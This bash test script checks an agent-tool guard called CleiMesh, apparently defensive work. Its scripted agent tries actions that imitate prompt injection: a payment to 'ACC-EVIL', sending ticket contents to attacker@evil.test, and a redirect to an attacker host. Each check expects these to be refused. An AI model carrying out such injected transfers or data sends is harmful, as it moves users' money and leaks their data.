#!/bin/bash
# CleiMesh evaluation kit: one section per property, each check printed as PASS or FAIL.
# Synthetic servers (stub_apc.py, stub_notify.py), a scripted agent (agent.py), the released cleimesh.
set -u
cd "$(dirname "$0")"
PASS=0; FAIL=0
check() { if eval "$2"; then echo "  PASS  $1"; PASS=$((PASS+1)); else echo "  FAIL  $1"; FAIL=$((FAIL+1)); fi; }
fresh() { export HOME=$(mktemp -d); }   # each section starts with new keys, tokens and receipts
LOG() { echo "$HOME/.local/share/cleimesh/receipts/receipts.jsonl"; }
add_apc() { cleimesh mcp add apc --print "$@" -- python /kit/stub_apc.py >/dev/null 2>"$HOME/add.err"; }
run_agent() { python /kit/agent.py "$1" 2>"$HOME/wrap.err"; }
echo "cleimesh $(cleimesh --version | awk '{print $2}')"

echo; echo "== 1. Exact binding: tool definition, arguments, destination, context"
fresh
add_apc --taints read_ticket --clean-only approve_payment --when-tainted approve_payment.account=ACC-1 --when-tainted approve_payment.amount='*'
OUT=$(run_agent '[["read_ticket",{"ticket_id":"T-1"}],["approve_payment",{"account":"ACC-1","amount":100}],["approve_payment",{"account":"ACC-EVIL","amount":9500}]]')
echo "$OUT" | sed 's/^/    /' | cut -c1-150
check "after reading the ticket, payment to the destination the token fixes (ACC-1) runs" 'echo "$OUT" | grep -q "^OK approve_payment"'
check "payment to the injected destination (ACC-EVIL) is refused" 'echo "$OUT" | grep -q "^REFUSED approve_payment.*argument account is outside"'
DEC=$(jq -c 'select(.params.decision=="allowed" and .params.tool=="approve_payment")' "$(LOG)" | head -1)
PIN=$(jq -r '.servers.apc.pins.approve_payment' "$HOME/.config/cleimesh/mcp/servers.json")
check "the decision receipt names the approved tool definition (digest = pin)" '[ "$(echo "$DEC" | jq -r .params.sandbox.tool_definition_sha256)" = "$PIN" ]'
check "the decision receipt binds the arguments (input digest) and names the read that tainted the agent" 'echo "$DEC" | jq -e ".params.input_sha256 and .params.authority.tainted_by" >/dev/null'
OUT=$(STUB_VARIANT=changed run_agent '[]')
check "a tool whose definition changed after approval is withheld" '! echo "$OUT" | grep -q "read_ticket" && grep -q "read_ticket of apc changed since it was added" "$HOME/wrap.err"'

echo; echo "== 2. Across servers: read through one, act through another"
fresh
add_apc --taints read_ticket --clean-only approve_payment
cleimesh mcp add notify --print --clean-only send_notice -- python /kit/stub_notify.py >/dev/null 2>&1
OUT=$(run_agent '[["send_notice",{"to":"ops@corp.test","body":"before reading"}],["read_ticket",{"ticket_id":"T-2"}],["send_notice",{"to":"attacker@evil.test","body":"ticket contents"}]]')
echo "$OUT" | sed 's/^/    /' | cut -c1-150
check "before any untrusted read, the other server's action runs" 'echo "$OUT" | grep -q "^OK send_notice"'
check "after reading through apc, the action through notify is refused" 'echo "$OUT" | grep -q "^REFUSED send_notice.*received untrusted content"'

echo; echo "== 3. Redirects, expiry (replay and delegation: see README)"
OUT=$(cleimesh demo redirect 2>&1)
echo "$OUT" | grep -E "REFUSED|saw 0" | sed 's/^/    /'
check "a redirect from a granted host to an ungranted one is refused on the connection" 'echo "$OUT" | grep -q "attacker.s server saw 0 connections"'
fresh
add_apc --taints read_ticket --clean-only approve_payment --ttl 3
sleep 5
OUT=$(run_agent '[["approve_payment",{"account":"ACC-1","amount":1}]]')
echo "$OUT" | sed 's/^/    /' | cut -c1-150
check "an expired token is refused" 'echo "$OUT" | grep -q "^REFUSED approve_payment" && echo "$OUT" | grep -qi "expir"'

echo; echo "== 4. Receipts: authorization, invocation and outcome, verifiable alone"
fresh
add_apc --taints read_ticket --clean-only approve_payment
run_agent '[["approve_payment",{"account":"ACC-1","amount":5}]]' >/dev/null
check "the log verifies against the node key" 'cleimesh audit verify >/dev/null 2>&1'
DSTEP=$(jq -r 'select(.params.decision=="allowed") | .step_id' "$(LOG)" | head -1)
check "the result receipt points to its decision receipt" 'jq -e --arg d "$DSTEP" "select(.action_id==\"cleimesh.tool_result\" and .params.decision_step==\$d)" "$(LOG)" >/dev/null'
sed -i '1s/approve_payment/approve_paymenX/' "$(LOG)"
check "a changed receipt makes verification fail" '! cleimesh audit verify >/dev/null 2>&1'

echo; echo "== 5. Timeout: outcome not known (about 60 s)"
fresh
add_apc --taints read_ticket --clean-only slow_operation
OUT=$(run_agent '[["slow_operation",{"seconds":75}]]')
echo "$OUT" | sed 's/^/    /' | cut -c1-150
check "the call is cut at the token's time limit, and the agent is told the outcome is unknown" 'echo "$OUT" | grep -q "timed out after 60000 ms; outcome unknown"'
RES=$(jq -c 'select(.action_id=="cleimesh.tool_result")' "$(LOG)" | head -1)
check "the result receipt records the outcome as unknown, not as failed" '[ "$(echo "$RES" | jq -r .params.observed.outcome)" = "unknown" ]'
STEP=$(echo "$RES" | jq -r .step_id)
cleimesh audit settle "$STEP" --outcome succeeded --evidence "operation found when re-read out of band" >/dev/null 2>&1
check "a person settles it later, linked to that result, with the evidence" 'jq -e --arg s "$STEP" "select(.action_id==\"cleimesh.tool_settled\" and .params.settles==\$s and .params.outcome==\"succeeded\")" "$(LOG)" >/dev/null'
check "it can be settled only once, and the chain still verifies" '! cleimesh audit settle "$STEP" --outcome failed --evidence again >/dev/null 2>&1 && cleimesh audit verify >/dev/null 2>&1'

echo; echo "== $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
